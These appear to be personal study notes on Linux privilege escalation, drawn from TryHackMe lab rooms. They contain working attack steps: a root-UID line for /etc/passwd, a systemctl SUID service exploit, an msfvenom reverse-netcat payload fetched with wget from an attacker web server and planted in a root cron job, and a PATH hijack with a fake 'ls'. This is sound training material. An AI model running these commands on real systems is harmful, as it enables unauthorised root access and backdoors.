## Privilege Escalation - Overview

-----

[Back to Table of Contents](../cysec)

> Horizontal and vertical privilege escalation:
 - horizontal privilege escalation - access pivot from users within the same permission scope
 - vertical privilege escalation - access pivot from user with lower permissions to user with higher permissions

Sometimes horizontal privilege escalation is necessary before executing vertical escalation. \
For example, if user1 (your foothold) has no misconfigurations or exploitable escalations to obtain root or another more highly privileged user, then it might be necessary to horizontally escalate to user2, who happens to have an exploitable binary with a SUID bit or a cronjob running with root permissions (or any other potential method). 

Ie. low privilege 1 -> low privilege 2 -> high privilege

>>## Useful Tools/Resources
> ### Informational Resources
> - [PayloadsAllTheThings - Privilege Escalation Overview](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#tools)
> - [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)    
> - [ A guide to Linux Privilege Escalation](https://payatu.com/guide-linux-privilege-escalation)
>### PrivEsc Automation, Scripts, and General Resources
> - [LinEnum](https://github.com/rebootuser/LinEnum) : Enumeration of linux systems for common privesc misconfigurations and potential exploits
> - LinPEAS   
> - LinuxSmartEnumeration   
> - BeRoot  
 > - [GTFOBins](https://gtfobins.github.io/) : Extremely useful collection of common Linux binaries and example privesc exploitation methods   


----- 
### Commands Relevant to PrivEsc
```
ls -lah

find . -type f -perm /4000 or /2000

sudo -l

vim --> :!sh
```
---
## SUID/SGID:
```
find . -user root -perm /x000
```

- 4000 is the permission flag for SUID
- 2000 is the permission flag for SGID
- ---

## Writable /etc/passwd:
    
Format of etc/passwd:	 
```
user:password_hash:UID:GID:root:/root:/bin/bash \
```

Since the passwords are not stored in plaintext, they first need to be hashed. 
This can be done simply by using openssl.

```
openssl passwd -1 -salt [thesalt] [thepassword]
```

Now, to tie it all together, the line to write into /etc/passwd, with user "new" and password "123" would be:

```
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```
---


## systemctl
Systemctl is a part of the linux filesystem which interacts with systemd and is responsible for services. Systemctl is sometimes misconfigured, and can be exploited if it has SUID or SUDO privileges. 

The systemctl privesc route is seen in the THM machine, "vulniversity"; after getting a webshell, the task is to privesc into root. 

Tying in concepts from above, the first thing to do is to find what potential misconfigurations or potentially exploitable binaries exist.
```
find . -user root -perm /4000
```
In this case, the results show that the systemctl binary has the s bit. 
Then, searching systemctl on GTFOBins reveals an example payload/exploit:
```
TF=$(mktemp).service

echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF

```
Basically, this creates a temporary file, TF, in the temp directory, a directory which we have write permissions as a low-privileged user.
After initializing the temporary service file, the exploit uses the echo command to write the service functions, line by line,
avoiding the need to use touch or other means , which we do not have permissions for. 

```bash
./systemctl link $TF
./systemctl enable --now $TF
```

After writing the new service configuration file, the service must then be linked and enabled via the vulnerable systemctl binary.

In this case, however, the configuration must be tailored for the specific task. The example provides a command to write out the permissions
via the id command to a file in the tmp directory, but the task is to read the root flag in the root directory. 

There are multiple avenues of attack that can be used to accomplish this, and in the real world executing a reverse shell would
and using a new netcat listener would likely be the most effective, however that is not necessary in this case.

To stay within the scope of the task and be precise, I simply created a command that would cp the root flag to a new file in the tmp directory.

```
ExecStart=/bin/sh -c "cp /root/root.txt /tmp/rootflag.txt"
```
While this use case is specific, the concept can be applied to complete most tasks if faced with a systemctl privesc route. 

----

## Crontab Exploitation
Cronjobs are automated tasks within a Linux system. If a cronjob is run with root privileges, it is possible to leverage these permissions by writing to the cronjob, and thus having that added command executed as root, the next time the cronjob runs. 

```
cat /etc/crontab
```
Format:

```
#  m   h dom mon dow user  command
```

Exploiting a crontab vulnerability is similar in concept to the systemctl privesc method.

This method is used when a vulnerable cronjob is found -- this may mean that a cronjob is configured to run a
process/command with root privileges while the relevant user can write to the cronjob. 
Using echo, a payload or command can be written to the cronjob, and when it is executed, the payload will be executed
with root privileges. 

For example, if a cronjob called "scanner" is found to be running every hour and with root privileges,
an attacker can write a custom command or create a payload using msfvenom, and then write that payload to the cronjob:
```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[ip] lport=[port] R > payload_name

```
The payload is created on the local machine, but it needs to get onto the target machine. This can be done multiple ways,
but a simple method is to create a local webserver:

```bash
python3 -m http.server 80

```
and then wget the payload onto the target machine, using the low-privilege shell that was obtained earlier.

```bash
cd /tmp

wget http://[ip]/payload_name
```
Finally, echo can be used to write the payload into the cronjob:
```
echo payload > /Documents/scanner.sh
```
Once the cronjob is initialized, the payload will be executed, and we will have a root shell. Just like with the systemctl
privesc above, this can be tailored to the needs of the task. If precision and scope is necessary, 
a payload can be created that will do just the required task and nothing more, for example, write a backdoor into the system
for later use. 


----
## PATH Variable
```
echo $PATH
```
Privilege escalation via exploiting the path variable happens when an attacker is able to create an "evil twin" of the actual binary,
and redirect that binary to the new, imitation one, with malicious code. 

In the TryHackMe Linux Privilege Escalation module, the vulnerable machine has a misconfiguration, where a script found on the users
desktop is actually executing the 'ls' command. 

Now that a target script is identified in which can be potentially imitated, the next step is to find a writable directory where we can create the imitation
executable with our payload. 


We can try /tmp, or simply search:
```bash
find / -writable -type d 

```
In this case, /tmp will be used, so after cd to /tmp, echo will once again be used to create the imitation binary/payload.
(and of course, allow execution)
```bash
echo "/bin/bash" > ls

chmod +x ls
```
Now that the imitation payload is created, which contains the command to initilize a bash shell, the payload must
be exported to the path variable. 
```bash
export PATH=/tmp:$PATH
```
To test if the exploit has worked, the targeted command can be run; in this case, 'ls' will no longer return the directory contents (/bin/ls will, if needed).

Finally, return to the original target script, and execute it. This will now execute the imitation payload and 
open a root shell. 

---
